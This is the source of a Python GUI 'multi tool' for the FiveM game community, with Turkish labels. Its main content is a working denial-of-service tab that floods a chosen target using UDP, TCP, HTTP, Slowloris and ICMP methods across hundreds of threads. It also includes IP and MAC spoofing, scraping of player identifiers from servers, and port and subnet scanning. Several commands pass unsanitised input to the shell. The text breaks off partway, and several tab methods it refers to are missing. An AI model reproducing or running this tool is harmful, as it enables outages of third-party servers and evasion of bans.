#!/usr/bin/env python3
# HARIBO MULTI TOOL v1.0 - Made By Haribo
import tkinter as tk
from tkinter import ttk, scrolledtext
import threading, socket, subprocess, os, sys, time, random, struct, ctypes, platform, winreg
from datetime import datetime
try:
    import requests
except Exception:
    subprocess.run([sys.executable,"-m","pip","install","requests"])
    import requests
BG="#0a0a0a";BG3="#161616";ACCENT="#ff2222"
TEXT="#e8e8e8";SUBTEXT="#666666";GREEN="#00ff77"
YELLOW="#ffcc00";RED="#ff2222";BLUE="#00aaff"
PURPLE="#aa44ff"
class HariboTool(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HARIBO MULTI TOOL v1.0  --  Made By Haribo")
        self.geometry("1060x740");self.minsize(900,600);self.configure(bg=BG)
        self.ddos_running=False;self._ddos_packets=0;self._ddos_t0=0
        self._style();self._header();self._notebook()
    def _style(self):
        s=ttk.Style(self);s.theme_use("clam")
        s.configure("TNotebook",background=BG,borderwidth=0)
        s.configure("TNotebook.Tab",background=BG3,foreground=TEXT,padding=[14,8],font=("Consolas",10,"bold"))
        s.map("TNotebook.Tab",background=[("selected",ACCENT)],foreground=[("selected","#ffffff")])
    def _header(self):
        h=tk.Frame(self,bg=BG,height=52);h.pack(fill="x");h.pack_propagate(False)
        tk.Label(h,text="=== HARIBO MULTI TOOL v1.0",bg=BG,fg=ACCENT,font=("Consolas",17,"bold")).pack(side="left",padx=18,pady=10)
        tk.Label(h,text="Made By Haribo",bg=BG,fg=SUBTEXT,font=("Consolas",10)).pack(side="right",padx=18)
        tk.Frame(self,bg=ACCENT,height=2).pack(fill="x")
    def _notebook(self):
        nb=ttk.Notebook(self);nb.pack(fill="both",expand=True,padx=4,pady=4)
        self._tab_ip(nb);self._tab_fivem(nb);self._tab_ddos(nb);self._tab_net(nb);self._tab_intel(nb);self._tab_monitor(nb);self._tab_about(nb);self._tab_crash(nb)
    def _btn(self,p,t,c,color=None,w=20,**kw):
        color=color or ACCENT
        return tk.Button(p,text=t,command=c,bg=color,fg="#fff",activebackground=color,activeforeground="#fff",
            relief="flat",bd=0,font=("Consolas",9,"bold"),cursor="hand2",width=w,pady=5,**kw)
    def _entry(self,p,width=28,default="",**kw):
        e=tk.Entry(p,width=width,bg=BG3,fg=TEXT,insertbackground=TEXT,relief="flat",bd=4,font=("Consolas",10),**kw)
        if default:e.insert(0,default)
        return e
    def _log(self,w,msg):
        w.configure(state="normal")
        w.insert("end",f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        w.see("end");w.configure(state="disabled")
    def _logbox(self,p,h=8,fg=None):
        fg=fg or GREEN
        return scrolledtext.ScrolledText(p,height=h,bg=BG3,fg=fg,font=("Consolas",9),state="disabled",relief="flat",bd=0)
    def _lf(self,p,t,c=None):
        c=c or ACCENT
        return tk.LabelFrame(p,text=f" {t} ",bg=BG,fg=c,font=("Consolas",9,"bold"),bd=1,relief="groove")
    def _tab_ip(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text="  IP DEG  ")
        tk.Label(f,text="FIVEM IP SPOOFER",bg=BG,fg=ACCENT,font=("Consolas",15,"bold")).pack(pady=(14,2))
        tk.Label(f,text="Proxy rotasyonu  |  Adaptor IP  |  MAC Spoof + DHCP",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack()
        cb=tk.Frame(f,bg=BG3);cb.pack(fill="x",padx=18,pady=4)
        tk.Label(cb,text="  Mevcut Dis IP:",bg=BG3,fg=SUBTEXT,font=("Consolas",10)).grid(row=0,column=0,padx=8,pady=8,sticky="w")
        self.cur_ip=tk.StringVar(value="?")
        tk.Label(cb,textvariable=self.cur_ip,bg=BG3,fg=GREEN,font=("Consolas",13,"bold")).grid(row=0,column=1,padx=8)
        self._btn(cb,"Sorgula",self._ip_fetch,color="#222",w=10).grid(row=0,column=2,padx=10,pady=6)
        mf=self._lf(f,"Yontem");mf.pack(fill="x",padx=18,pady=6)
        self.ip_method=tk.StringVar(value="proxy")
        for lbl,val in [("Proxy Rotasyonu (SOCKS5/HTTP)","proxy"),("Adaptor IP Degistir (LAN)","adapter"),("MAC Spoof + DHCP Yenile","mac")]:
            tk.Radiobutton(mf,text=lbl,variable=self.ip_method,value=val,bg=BG,fg=TEXT,selectcolor=BG3,activebackground=BG,font=("Consolas",10)).pack(anchor="w",padx=18,pady=3)
        pf=self._lf(f,"Proxy Listesi (her satira: ip:port)",YELLOW);pf.pack(fill="x",padx=18,pady=4)
        self.proxy_box=tk.Text(pf,height=3,bg=BG3,fg=TEXT,font=("Consolas",9),insertbackground=TEXT,relief="flat",bd=4)
        self.proxy_box.pack(fill="x",padx=5,pady=5)
        self.proxy_box.insert("1.0","# Ornek: 1.2.3.4:1080\n# Proxy listeni buraya ekle")
        af=self._lf(f,"Adaptor Adi (MAC/IP icin)",YELLOW);af.pack(fill="x",padx=18,pady=4)
        row=tk.Frame(af,bg=BG);row.pack(fill="x",padx=5,pady=5)
        tk.Label(row,text="Adaptor:",bg=BG,fg=TEXT,font=("Consolas",9)).pack(side="left",padx=5)
        self.adapter_name=self._entry(row,width=22,default="Ethernet");self.adapter_name.pack(side="left",padx=5)
        self._btn(row,"Listele",self._ip_list,color="#333",w=10).pack(side="left",padx=5)
        br=tk.Frame(f,bg=BG);br.pack(pady=12)
        self._btn(br,"IP DEGISTIR",self._ip_change,color=ACCENT,w=20).pack(side="left",padx=8)
        self._btn(br,"Orijinale Don",self._ip_restore,color="#2a2a2a",w=16).pack(side="left",padx=5)
        self._btn(br,"IP Sorgula",self._ip_fetch,color="#2a2a2a",w=14).pack(side="left",padx=5)
        self.ip_log=self._logbox(f,h=6);self.ip_log.pack(fill="x",padx=18,pady=(4,14))
    def _ip_fetch(self):
        def w():
            for url in ["https://api.ipify.org","https://ifconfig.me/ip"]:
                try:
                    ip=requests.get(url,timeout=5).text.strip()
                    self.cur_ip.set(ip);self._log(self.ip_log,f"Dis IP: {ip}");return
                except:pass
            self._log(self.ip_log,"[ERR] IP alinamadi")
        threading.Thread(target=w,daemon=True).start()
    def _ip_change(self):
        m=self.ip_method.get()
        if m=="proxy":self._ip_proxy()
        elif m=="adapter":self._ip_adapter()
        else:self._ip_mac()
    def _ip_proxy(self):
        def w():
            px=[l.strip() for l in self.proxy_box.get("1.0","end").splitlines() if l.strip() and not l.startswith("#")]
            if not px:self._log(self.ip_log,"[!] Proxy ekle");return
            c=random.choice(px);self._log(self.ip_log,f"Proxy secildi: {c}")
            try:
                k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",0,winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k,"ProxyEnable",0,winreg.REG_DWORD,1)
                winreg.SetValueEx(k,"ProxyServer",0,winreg.REG_SZ,c);winreg.CloseKey(k)
                ctypes.windll.Wininet.InternetSetOptionW(0,39,0,0)
                ctypes.windll.Wininet.InternetSetOptionW(0,37,0,0)
                self._log(self.ip_log,f"[OK] Proxy aktif: {c}");self._log(self.ip_log,"FiveM yeniden baslat.")
                time.sleep(1);self._ip_fetch()
            except Exception as e:self._log(self.ip_log,f"[ERR] {e} -- Admin olarak calistir")
        threading.Thread(target=w,daemon=True).start()
    def _ip_adapter(self):
        def w():
            ad=self.adapter_name.get().strip() or "Ethernet"
            ip=f"192.168.{random.randint(1,254)}.{random.randint(2,253)}"
            gw=".".join(ip.split(".")[:3])+".1"
            self._log(self.ip_log,f"IP degistiriliyor -> {ip} (GW:{gw})")
            r=subprocess.run(f"netsh interface ip set address name=\"{ad}\" static {ip} 255.255.255.0 {gw}",shell=True,capture_output=True,text=True)
            if r.returncode==0:self._log(self.ip_log,f"[OK] {ip}")
            else:self._log(self.ip_log,f"[ERR] {r.stderr.strip() or 'Admin gerekli'}")
        threading.Thread(target=w,daemon=True).start()
    def _ip_mac(self):
        def w():
            ad=self.adapter_name.get().strip() or "Ethernet"
            mb=[random.randint(0,255) for _ in range(6)];mb[0]=(mb[0]&0xFE)|0x02
            ms="".join(f"{b:02X}" for b in mb);mf="-".join(f"{b:02X}" for b in mb)
            self._log(self.ip_log,f"MAC Spoof -> {mf}")
            try:
                base=r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
                hive=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,base);i=0
                while True:
                    try:
                        nm=winreg.EnumKey(hive,i);sub=winreg.OpenKey(hive,nm,0,winreg.KEY_READ|winreg.KEY_SET_VALUE)
                        try:
                            desc,_=winreg.QueryValueEx(sub,"DriverDesc")
                            if ad.lower() in desc.lower():
                                winreg.SetValueEx(sub,"NetworkAddress",0,winreg.REG_SZ,ms)
                                self._log(self.ip_log,f"[OK] MAC yazildi: {mf}")
                        except:pass
                        winreg.CloseKey(sub);i+=1
                    except OSError:break
                winreg.CloseKey(hive)
                self._log(self.ip_log,"Adaptor yeniden baslatiliyor...")
                subprocess.run(f"netsh interface set interface \"{ad}\" disabled",shell=True,capture_output=True);time.sleep(2)
                subprocess.run(f"netsh interface set interface \"{ad}\" enabled",shell=True,capture_output=True);time.sleep(3)
                self._log(self.ip_log,"DHCP yenileniyor...")
                subprocess.run("ipconfig /release",shell=True,capture_output=True);time.sleep(1)
                subprocess.run("ipconfig /renew",shell=True,capture_output=True)
                self._log(self.ip_log,"[OK] MAC spoof + DHCP tamamlandi");self._ip_fetch()
            except Exception as e:self._log(self.ip_log,f"[ERR] {e} -- Admin gerekli")
        threading.Thread(target=w,daemon=True).start()
    def _ip_restore(self):
        def w():
            ad=self.adapter_name.get().strip() or "Ethernet"
            self._log(self.ip_log,"Proxy kaldiriliyor + DHCP geri...")
            try:
                k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",0,winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k,"ProxyEnable",0,winreg.REG_DWORD,0);winreg.CloseKey(k)
                ctypes.windll.Wininet.InternetSetOptionW(0,39,0,0);self._log(self.ip_log,"[OK] Proxy kaldirildi")
            except:pass
            subprocess.run(f"netsh interface ip set address name=\"{ad}\" dhcp",shell=True,capture_output=True)
            subprocess.run("ipconfig /renew",shell=True,capture_output=True)
            self._log(self.ip_log,"[OK] DHCP geri");self._ip_fetch()
        threading.Thread(target=w,daemon=True).start()
    def _ip_list(self):
        def w():
            r=subprocess.run("netsh interface show interface",shell=True,capture_output=True,text=True)
            self._log(self.ip_log,"-- Adaptorler --")
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.ip_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _tab_fivem(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text="  FIVEM TOOL  ")
        tk.Label(f,text="FIVEM TOOL -- Cok Amacli",bg=BG,fg=ACCENT,font=("Consolas",15,"bold")).pack(pady=(14,2))
        tk.Label(f,text="Server bilgisi | Oyuncu | Resource | CFX | HWID | Scan",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack()
        pw=tk.PanedWindow(f,orient="horizontal",bg=BG,sashwidth=4);pw.pack(fill="both",expand=True,padx=8,pady=4)
        left=tk.Frame(pw,bg=BG,width=300);pw.add(left,minsize=270)
        sf=self._lf(left,"Sunucu (IP:Port)");sf.pack(fill="x",padx=4,pady=4)
        self.fm_server=self._entry(sf,width=30,default="1.2.3.4:30120");self.fm_server.pack(padx=6,pady=4)
        cf=self._lf(left,"CFX Kodu",YELLOW);cf.pack(fill="x",padx=4,pady=4)
        self.fm_cfx_e=self._entry(cf,width=30);self.fm_cfx_e.pack(padx=6,pady=4)
        for lbl,cmd,col in [("Sunucu Bilgisi",self._fm_info,ACCENT),("Oyuncu Listesi",self._fm_players,"#883300"),("Resource Listesi",self._fm_resources,"#444"),("Ping Ol",self._fm_ping,"#006655"),("CFX Lookup",self._fm_cfx,"#004488"),("HWID/Sistem",self._fm_hwid,"#333"),("Port Range Tara",self._fm_scan,"#553366"),("Logu Kaydet",self._fm_save,"#334422")]:
            self._btn(left,lbl,cmd,color=col,w=30).pack(fill="x",padx=4,pady=2)
        rf=self._lf(left,"Tarama Aralik",SUBTEXT);rf.pack(fill="x",padx=4,pady=4)
        self.fm_range=self._entry(rf,width=28,default="1.2.3.1-254");self.fm_range.pack(padx=5,pady=4)
        right=tk.Frame(pw,bg=BG);pw.add(right,minsize=420)
        tk.Label(right,text="CIKTI",bg=BG,fg=ACCENT,font=("Consolas",10,"bold")).pack(anchor="w",padx=5,pady=(4,1))
        self.fm_log=self._logbox(right,fg=GREEN);self.fm_log.pack(fill="both",expand=True,padx=5,pady=4)
        self._btn(right,"Temizle",lambda:(self.fm_log.configure(state="normal"),self.fm_log.delete("1.0","end"),self.fm_log.configure(state="disabled")),color="#1e1e1e",w=12).pack(anchor="e",padx=5,pady=2)
    def _fm_parse(self):
        raw=self.fm_server.get().strip()
        if not raw:return None,None
        p=raw.split(":");return p[0],int(p[1]) if len(p)>1 else 30120
    def _fm_info(self):
        def w():
            h,p=self._fm_parse()
            if not h:self._log(self.fm_log,"[ERR] IP:Port gir");return
            self._log(self.fm_log,f"Sorgulama: {h}:{p}")
            try:
                d=requests.get(f"http://{h}:{p}/info.json",timeout=6).json();v=d.get("vars",{})
                self._log(self.fm_log,"?"*52)
                for k,val in [("Sunucu Adi",v.get("sv_projectName","N/A")),("Aciklama",v.get("sv_projectDesc","N/A")),("FiveM Ver",d.get("version","N/A")),("Max Oyuncu",v.get("sv_maxClients","N/A")),("OneSync",v.get("onesync_enabled","N/A")),("Gametype",v.get("gametype","N/A")),("Mapname",v.get("mapname","N/A")),("Tags",v.get("tags","N/A"))]:
                    self._log(self.fm_log,f"  {k:<14}: {val}")
                self._log(self.fm_log,"?"*52)
            except Exception as e:self._log(self.fm_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_players(self):
        def w():
            h,p=self._fm_parse()
            if not h:self._log(self.fm_log,"[ERR] IP:Port gir");return
            try:
                pl=requests.get(f"http://{h}:{p}/players.json",timeout=6).json()
                self._log(self.fm_log,f"??? Oyuncular ({len(pl)} kisi) ???")
                for x in pl:
                    self._log(self.fm_log,f"  [{x.get('id','?'):>3}] {x.get('name','?'):<28} ping:{x.get('ping','?')}ms")
                    for ident in x.get("identifiers",[]):self._log(self.fm_log,f"        {ident}")
                self._log(self.fm_log,"?"*50)
            except Exception as e:self._log(self.fm_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_resources(self):
        def w():
            h,p=self._fm_parse()
            if not h:self._log(self.fm_log,"[ERR] IP:Port gir");return
            try:
                d=requests.get(f"http://{h}:{p}/info.json",timeout=6).json();res=d.get("resources",[])
                self._log(self.fm_log,f"??? Resources ({len(res)}) ???")
                for i,r in enumerate(res,1):self._log(self.fm_log,f"  {i:4}. {r}")
            except Exception as e:self._log(self.fm_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_ping(self):
        def w():
            h,_=self._fm_parse()
            if not h:return
            self._log(self.fm_log,f"Ping: {h}")
            r=subprocess.run(f"ping -n 4 {h}",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.fm_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_cfx(self):
        def w():
            code=self.fm_cfx_e.get().strip()
            if not code:self._log(self.fm_log,"[ERR] CFX kodu gir");return
            try:
                d=requests.get(f"https://servers-frontend.fivem.net/api/servers/single/{code}",timeout=8).json().get("Data",{})
                v=d.get("vars",{});ep=d.get("connectEndPoints",["N/A"])
                self._log(self.fm_log,f"??? CFX:{code} ???")
                self._log(self.fm_log,f"  Adi: {v.get('sv_projectName','N/A')}")
                self._log(self.fm_log,f"  IP:  {ep[0] if ep else 'N/A'}")
                self._log(self.fm_log,f"  Oyuncu: {d.get('clients','?')} / {d.get('sv_maxclients','?')}")
            except Exception as e:self._log(self.fm_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_hwid(self):
        self._log(self.fm_log,"??? HWID / Sistem ???")
        try:
            k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Cryptography")
            g,_=winreg.QueryValueEx(k,"MachineGuid");winreg.CloseKey(k)
            self._log(self.fm_log,f"  GUID: {g}")
        except:self._log(self.fm_log,"  GUID: [Admin gerekli]")
        self._log(self.fm_log,f"  PC: {os.environ.get('COMPUTERNAME','N/A')}")
        self._log(self.fm_log,f"  User: {os.environ.get('USERNAME','N/A')}")
        self._log(self.fm_log,f"  OS: {platform.version()}")
        try:
            r=subprocess.run("getmac /fo csv /nh",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines()[:3]:
                p=ln.strip().strip('"').split('","')
                if p:self._log(self.fm_log,f"  MAC: {p[0]}")
        except:pass
    def _fm_scan(self):
        def w():
            rng=self.fm_range.get().strip()
            self._log(self.fm_log,f"Tarama: {rng}:30120")
            try:
                base,tail=rng.rsplit(".",1)
                s,e=map(int,tail.split("-")) if "-" in tail else (int(tail),int(tail))
                found=[]
                for i in range(s,e+1):
                    ip=f"{base}.{i}"
                    try:
                        sk=socket.socket();sk.settimeout(0.4);sk.connect((ip,30120));sk.close()
                        self._log(self.fm_log,f"  [OPEN] {ip}:30120");found.append(ip)
                    except:pass
                self._log(self.fm_log,f"Bitti -- {len(found)} sunucu")
            except Exception as ex:self._log(self.fm_log,f"[ERR] {ex}")
        threading.Thread(target=w,daemon=True).start()
    def _fm_save(self):
        c=self.fm_log.get("1.0","end");fn=f"fivem_{int(time.time())}.txt"
        with open(fn,"w",encoding="utf-8") as fp:fp.write(c)
        self._log(self.fm_log,f"[OK] {fn}")
    def _tab_ddos(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text="  DDOS/FLOOD  ")
        tk.Label(f,text="STRES TEST & FLOOD",bg=BG,fg=RED,font=("Consolas",15,"bold")).pack(pady=(14,2))
        tk.Label(f,text="UDP | TCP | HTTP GET/POST | Slowloris | ICMP",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack()
        cfg=tk.Frame(f,bg=BG3);cfg.pack(fill="x",padx=18,pady=6)
        for i,(lbl,attr,dft) in enumerate([("Hedef IP/Domain","dd_ip","1.2.3.4"),("Port","dd_port","80"),("Thread Sayisi","dd_threads","300"),("Paket Boyutu(B)","dd_pkt","1024"),("Sure(sn,0=sonsuz)","dd_dur","0")]):
            tk.Label(cfg,text=f"  {lbl}:",bg=BG3,fg=SUBTEXT,font=("Consolas",10),width=22,anchor="w").grid(row=i,column=0,padx=6,pady=5,sticky="w")
            e=self._entry(cfg,width=28,default=dft);e.grid(row=i,column=1,padx=6,pady=5,sticky="w");setattr(self,attr,e)
        tk.Label(cfg,text="  Yontem:",bg=BG3,fg=SUBTEXT,font=("Consolas",10),width=22,anchor="w").grid(row=5,column=0,padx=6,pady=5,sticky="w")
        self.dd_method=ttk.Combobox(cfg,values=["UDP Flood","TCP Flood","HTTP GET Flood","HTTP POST Flood","Slowloris","ICMP Flood"],state="readonly",width=27,font=("Consolas",10))
        self.dd_method.current(0);self.dd_method.grid(row=5,column=1,padx=6,pady=5,sticky="w")
        sb=tk.Frame(f,bg=BG3);sb.pack(fill="x",padx=18,pady=4)
        self.dd_sent=tk.StringVar(value="0");self.dd_spd=tk.StringVar(value="0 pkt/s");self.dd_st=tk.StringVar(value="HAZIR")
        for col,(lbl,var,clr) in enumerate([("Gonderilen:",self.dd_sent,GREEN),("Hiz:",self.dd_spd,YELLOW),("Durum:",self.dd_st,ACCENT)]):
            tk.Label(sb,text=f"  {lbl}",bg=BG3,fg=SUBTEXT,font=("Consolas",10)).grid(row=0,column=col*2,padx=12,pady=8,sticky="w")
            tk.Label(sb,textvariable=var,bg=BG3,fg=clr,font=("Consolas",12,"bold")).grid(row=0,column=col*2+1,padx=4,sticky="w")
        br=tk.Frame(f,bg=BG);br.pack(pady=8)
        self._btn(br,"BASLAT",self._dd_start,color=RED,w=22).pack(side="left",padx=10)
        self._btn(br,"DURDUR",self._dd_stop,color="#2a2a2a",w=22).pack(side="left",padx=10)
        self.dd_log=self._logbox(f,h=10,fg=RED);self.dd_log.pack(fill="both",expand=True,padx=18,pady=(4,14))
    def _dd_start(self):
        if self.ddos_running:self._log(self.dd_log,"[!] Zaten calisiyor");return
        try:
            tgt=self.dd_ip.get().strip();port=int(self.dd_port.get());tcnt=int(self.dd_threads.get())
            psize=int(self.dd_pkt.get());dur=int(self.dd_dur.get());method=self.dd_method.get()
        except:self._log(self.dd_log,"[ERR] Gecerli deger gir");return
        self.ddos_running=True;self._ddos_packets=0;self._ddos_t0=time.time();self.dd_st.set("CALISIYOR")
        self._log(self.dd_log,f"[START] {method} -> {tgt}:{port} | {tcnt}t | {psize}B | {'sonsuz' if not dur else str(dur)+'s'}")
        for _ in range(tcnt):threading.Thread(target=self._dd_work,args=(tgt,port,psize,method,dur),daemon=True).start()
        threading.Thread(target=self._dd_stats,daemon=True).start()
    def _dd_work(self,tgt,port,ps,method,dur):
        payload=os.urandom(ps);dl=time.time()+dur if dur>0 else float("inf")
        while self.ddos_running and time.time()<dl:
            try:
                if method=="UDP Flood":
                    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(payload,(tgt,port));s.close()
                elif method=="TCP Flood":
                    s=socket.socket();s.settimeout(1);s.connect((tgt,port));s.send(payload);s.close()
                elif method=="HTTP GET Flood":
                    s=socket.socket();s.settimeout(2);s.connect((tgt,port))
                    s.send(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nHost:{tgt}\r\nUser-Agent:Mozilla/5.0\r\n\r\n".encode());s.close()
                elif method=="HTTP POST Flood":
                    s=socket.socket();s.settimeout(2);s.connect((tgt,port))
                    b="x="+"A"*ps;s.send(f"POST / HTTP/1.1\r\nHost:{tgt}\r\nContent-Length:{len(b)}\r\nContent-Type:application/x-www-form-urlencoded\r\n\r\n{b}".encode());s.close()
                elif method=="Slowloris":
                    s=socket.socket();s.settimeout(6);s.connect((tgt,port))
                    s.send(f"GET / HTTP/1.1\r\nHost:{tgt}\r\n".encode())
                    while self.ddos_running:s.send(b"X-a:b\r\n");time.sleep(14)
                elif method=="ICMP Flood":
                    s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
                    s.sendto(struct.pack("bbHHh",8,0,0,1,1)+payload,(tgt,0));s.close()
                self._ddos_packets+=1
            except:pass
    def _dd_stats(self):
        while self.ddos_running:
            e=time.time()-self._ddos_t0;spd=int(self._ddos_packets/e) if e>0 else 0
            self.dd_sent.set(f"{self._ddos_packets:,}");self.dd_spd.set(f"{spd:,} pkt/s");time.sleep(0.5)
    def _dd_stop(self):
        self.ddos_running=False;self.dd_st.set("DURDU")
        self._log(self.dd_log,f"[STOP] Toplam: {self._ddos_packets:,} paket")
    def _tab_net(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text="  NETWORK  ")
        tk.Label(f,text="AG ARACLARI",bg=BG,fg=BLUE,font=("Consolas",15,"bold")).pack(pady=(14,2))
        tk.Label(f,text="GeoIP | Port Scan | Ping | Traceroute | DNS | Whois | Subnet | Banner | Netstat",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack()
        pw=tk.PanedWindow(f,orient="horizontal",bg=BG,sashwidth=4);pw.pack(fill="both",expand=True,padx=8,pady=4)
        left=tk.Frame(pw,bg=BG,width=280);pw.add(left,minsize=260)
        tf=self._lf(left,"Hedef",BLUE);tf.pack(fill="x",padx=4,pady=4)
        tk.Label(tf,text="IP/Domain:",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack(anchor="w",padx=6)
        self.nt_tgt=self._entry(tf,width=28,default="google.com");self.nt_tgt.pack(padx=6,pady=3)
        tk.Label(tf,text="Port/Aralik:",bg=BG,fg=SUBTEXT,font=("Consolas",9)).pack(anchor="w",padx=6)
        self.nt_port=self._entry(tf,width=28,default="1-1024");self.nt_port.pack(padx=6,pady=3)
        for lbl,cmd,col in [("IP Lookup/GeoIP",self._nt_geo,BLUE),("Port Tarayici",self._nt_scan,"#005588"),("Ping",self._nt_ping,"#226633"),("Traceroute",self._nt_trace,"#553300"),("DNS Lookup",self._nt_dns,"#550055"),("Whois",self._nt_whois,"#443300"),("Subnet Tarama",self._nt_subnet,"#004444"),("Banner Grab",self._nt_banner,"#442200"),("Yerel Ag Bilgisi",self._nt_local,"#333"),("ARP Tablosu",self._nt_arp,"#222"),("Netstat",self._nt_netstat,"#1a1a1a")]:
            self._btn(left,lbl,cmd,color=col,w=28).pack(fill="x",padx=4,pady=2)
        right=tk.Frame(pw,bg=BG);pw.add(right,minsize=400)
        tk.Label(right,text="CIKTI",bg=BG,fg=BLUE,font=("Consolas",10,"bold")).pack(anchor="w",padx=5,pady=(4,1))
        self.nt_log=self._logbox(right,fg=BLUE);self.nt_log.pack(fill="both",expand=True,padx=5,pady=4)
        self._btn(right,"Temizle",lambda:(self.nt_log.configure(state="normal"),self.nt_log.delete("1.0","end"),self.nt_log.configure(state="disabled")),color="#1a1a1a",w=12).pack(anchor="e",padx=5,pady=2)
    def _nt_res(self):
        t=self.nt_tgt.get().strip()
        try:return socket.gethostbyname(t)
        except:return t
    def _nt_geo(self):
        def w():
            ip=self._nt_res();self._log(self.nt_log,f"GeoIP: {ip}")
            try:
                d=requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,timezone,mobile,proxy,hosting,query",timeout=8).json()
                if d.get("status")=="success":
                    self._log(self.nt_log,"?"*48)
                    for k,v in [("IP",d.get("query")),("Ulke",f"{d.get('country')} / {d.get('regionName')}"),("Sehir",d.get("city")),("ISP",d.get("isp")),("Org",d.get("org")),("AS",d.get("as")),("Konum",f"{d.get('lat')}, {d.get('lon')}"),("Timezone",d.get("timezone")),("Mobile",d.get("mobile")),("Proxy",d.get("proxy")),("Hosting",d.get("hosting"))]:
                        self._log(self.nt_log,f"  {k:<10}: {v}")
                    self._log(self.nt_log,"?"*48)
                else:self._log(self.nt_log,f"[ERR] {d.get('message')}")
            except Exception as e:self._log(self.nt_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_scan(self):
        def w():
            ip=self._nt_res();pr=self.nt_port.get().strip()
            try:ps,pe=map(int,pr.split("-")) if "-" in pr else (int(pr),int(pr))
            except:ps,pe=1,1024
            self._log(self.nt_log,f"Port tarama: {ip} [{ps}-{pe}]")
            op=[];lock=threading.Lock()
            def sc(p):
                try:
                    s=socket.socket();s.settimeout(0.5);s.connect((ip,p));s.close()
                    with lock:op.append(p);self._log(self.nt_log,f"  [OPEN] {p}/tcp")
                except:pass
            ts=[]
            for port in range(ps,pe+1):
                t=threading.Thread(target=sc,args=(port,),daemon=True);ts.append(t);t.start()
                if len(ts)>=250:
                    for x in ts:x.join()
                    ts.clear()
            for x in ts:x.join()
            self._log(self.nt_log,f"Bitti -- {len(op)} acik port")
        threading.Thread(target=w,daemon=True).start()
    def _nt_ping(self):
        def w():
            t=self.nt_tgt.get().strip();self._log(self.nt_log,f"Ping -> {t}")
            r=subprocess.run(f"ping -n 4 {t}",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.nt_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_trace(self):
        def w():
            t=self.nt_tgt.get().strip();self._log(self.nt_log,f"Traceroute -> {t}")
            r=subprocess.run(f"tracert -h 30 {t}",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.nt_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_dns(self):
        def w():
            t=self.nt_tgt.get().strip();self._log(self.nt_log,f"DNS -> {t}")
            r=subprocess.run(f"nslookup {t}",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.nt_log,f"  {ln}")
            try:self._log(self.nt_log,f"  Resolved: {socket.gethostbyname(t)}")
            except:pass
        threading.Thread(target=w,daemon=True).start()
    def _nt_whois(self):
        def w():
            ip=self._nt_res();self._log(self.nt_log,f"Whois -> {ip}")
            try:
                d=requests.get(f"https://rdap.arin.net/registry/ip/{ip}",timeout=8).json()
                self._log(self.nt_log,f"  Ad: {d.get('name','N/A')}")
                self._log(self.nt_log,f"  Handle: {d.get('handle','N/A')}")
                self._log(self.nt_log,f"  Ulke: {d.get('country','N/A')}")
            except Exception as e:self._log(self.nt_log,f"[ERR] {e}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_subnet(self):
        def w():
            t=self.nt_tgt.get().strip();base=".".join(t.split(".")[:3])
            self._log(self.nt_log,f"Subnet: {base}.1-254")
            alive=[];lock=threading.Lock()
            def ck(ip):
                r=subprocess.run(f"ping -n 1 -w 300 {ip}",shell=True,capture_output=True)
                if r.returncode==0:
                    with lock:alive.append(ip);self._log(self.nt_log,f"  [UP] {ip}")
            ts=[threading.Thread(target=ck,args=(f"{base}.{i}",),daemon=True) for i in range(1,255)]
            for x in ts:x.start()
            for x in ts:x.join()
            self._log(self.nt_log,f"Bitti -- {len(alive)} aktif")
        threading.Thread(target=w,daemon=True).start()
    def _nt_banner(self):
        def w():
            ip=self._nt_res();pr=self.nt_port.get().strip();port=int(pr.split("-")[0]) if pr else 80
            self._log(self.nt_log,f"Banner: {ip}:{port}")
            try:
                s=socket.socket();s.settimeout(3);s.connect((ip,port))
                s.send(b"HEAD / HTTP/1.0\r\nHost: "+ip.encode()+b"\r\n\r\n")
                b=s.recv(2048).decode(errors="replace");s.close()
                for ln in b.splitlines():self._log(self.nt_log,f"  {ln}")
            except Exception as e:self._log(self.nt_log,f"[ERR] {e}")
